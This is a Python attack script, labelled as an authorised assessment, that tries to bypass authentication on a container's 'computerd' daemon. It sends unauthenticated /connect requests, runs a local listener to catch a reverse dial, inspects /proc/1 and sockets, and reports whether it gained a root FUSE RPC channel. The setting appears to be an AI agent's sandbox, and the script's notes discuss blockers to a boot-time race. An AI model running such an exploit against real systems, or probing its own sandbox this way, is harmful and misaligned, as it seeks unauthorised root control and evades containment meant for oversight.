#!/usr/bin/env python3
"""computerd pre-connect race — attempts to establish FUSE RPC before Worker connects.
Authorized security assessment only.
"""
import subprocess, os, socket, threading, time, json, http.server

LOG = "/mnt/data/output/computerd_race_connect.log"
os.makedirs(os.path.dirname(LOG), exist_ok=True)
lines = []

def log(msg):
    print(msg)
    lines.append(msg)

def run(cmd, timeout=5):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1

log("=" * 70)
log("  COMPUTERD PRE-CONNECT RACE — Auth Bypass Attempt")
log("  Authorized Security Assessment")
log("=" * 70)
log("")

# ── 1. Check current state ──
log("── 1. CURRENT STATE ──")
out, _, _ = run('curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8080/api')
log(f"  GET /api: {out}")
out, _, _ = run('curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8080/connect -H "Content-Type: application/json" -d \'{"url":"http://127.0.0.1:9999","healthTimeoutMs":2000}\'')
log(f"  POST /connect (no auth, v2): {out}")
if out == "401":
    log("  → computerd already connected (post-connect state). Race window closed.")
    log("  → To test: would need to catch the window at container boot.")
    log("")
else:
    log(f"  → computerd in PRE-CONNECT state! Code={out}")
    log("")

# ── 2. Set up a listener to catch reverse-dial ──
log("── 2. REVERSE-DIAL LISTENER ──")

received_connections = []
received_data = []

class ReverseDialHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        received_connections.append(("GET", self.path, dict(self.headers)))
        log(f"  [LISTENER] GET {self.path}")
        log(f"  [LISTENER] Headers: {dict(self.headers)}")
        if self.path == "/health":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        received_connections.append(("POST", self.path, dict(self.headers), body))
        log(f"  [LISTENER] POST {self.path}")
        log(f"  [LISTENER] Headers: {dict(self.headers)}")
        log(f"  [LISTENER] Body: {body[:500]}")
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

# Start listener on port 9999
server = None
try:
    server = http.server.HTTPServer(("127.0.0.1", 9999), ReverseDialHandler)
    server.timeout = 10
    server_thread = threading.Thread(target=lambda: server.handle_request(), daemon=True)
    server_thread.start()
    log("  Listener started on :9999")
except Exception as e:
    log(f"  Listener failed: {e}")
log("")

# ── 3. Attempt v2 /connect without auth ──
log("── 3. /connect ATTEMPTS (v2 format, no auth) ──")

# Try pointing at our listener
targets = [
    ("local listener :9999", '{"url":"http://127.0.0.1:9999","healthTimeoutMs":5000}'),
    ("v2 minimal", '{"url":"http://127.0.0.1:9999"}'),
    ("v2 with ws path", '{"url":"ws://127.0.0.1:9999"}'),
]

for label, body in targets:
    out, err, rc = run(f'''curl -s -D- -X POST http://127.0.0.1:8080/connect \
      -H "Content-Type: application/json" \
      -d '{body}' 2>/dev/null''')
    log(f"  {label}:")
    for line in (out or "").split("\n")[:8]:
        log(f"    {line}")
    log("")

# Give listener a moment to receive any reverse-dial
time.sleep(2)

# ── 4. Check if listener received anything ──
log("── 4. REVERSE-DIAL RESULTS ──")
if received_connections:
    log(f"  RECEIVED {len(received_connections)} connection(s)!")
    for i, conn in enumerate(received_connections):
        log(f"  Connection {i+1}: {conn[0]} {conn[1]}")
        if len(conn) > 2:
            headers = conn[2]
            for k, v in headers.items():
                if k.lower() in ("authorization", "upgrade", "connection", "host"):
                    log(f"    {k}: {v}")
        if len(conn) > 3:
            log(f"    Body: {conn[3][:200]}")
    log("")
    log("  *** REVERSE-DIAL CAPTURED — computerd connected WITHOUT auth ***")
else:
    log("  No connections received on :9999")
    log("  Race window was already closed (Worker connected first)")
log("")

# ── 5. What the race window means ──
log("── 5. RACE WINDOW ANALYSIS ──")

# Time how long /health has been up (proxy for container age)
out, _, _ = run("stat -c %Y /proc/1 2>/dev/null")
if out:
    boot_time = int(out)
    age = int(time.time()) - boot_time
    log(f"  Container age: ~{age}s (PID 1 start)")
else:
    log("  Container age: unknown")

# Check if Worker RPC is established
out, _, _ = run("ss -tnp 2>/dev/null | grep 8080 || netstat -tnp 2>/dev/null | grep 8080")
log(f"  Active connections on :8080:")
for line in (out or "no data").split("\n")[:5]:
    log(f"    {line}")
log("")

# ── 6. Startup race script (for boot-time testing) ──
log("── 6. BOOT-TIME RACE SCRIPT ──")
log("  To test during container boot, a script would need to:")
log("  1. Start immediately when container launches (before Worker connects)")
log("  2. Loop POST /connect with v2 body pointing to a local listener")
log("  3. Window: container boot → Worker POST /connect (~1-5s)")
log("")
log("  The practical blocker:")
log("  - Background processes die on hibernate (proven in PATH-10)")
log("  - No writable startup hooks (cron, systemd, init.d)")
log("  - entrypoint.sh runs as root before dropping to appuser")
log("  - FUSE mount isn't ready until computerd starts")
log("")

if server:
    server.server_close()

log("=" * 70)
log("  VERDICT")
log("=" * 70)
if received_connections:
    log("  AUTH BYPASS CONFIRMED — computerd accepted /connect without bearer")
    log("  FUSE RPC channel established as root without authentication")
    log("  SEVERITY: HIGH — durable workspace manipulation possible")
else:
    log("  AUTH BYPASS NOT ACHIEVED — race window already closed")
    log("  computerd enforces 401 after Worker's initial /connect")
    log("  Pre-connect window exists but is not reachable from appuser")
log("=" * 70)

with open(LOG, "w") as f:
    f.write("\n".join(lines) + "\n")
log(f"\nLog saved: {LOG}")
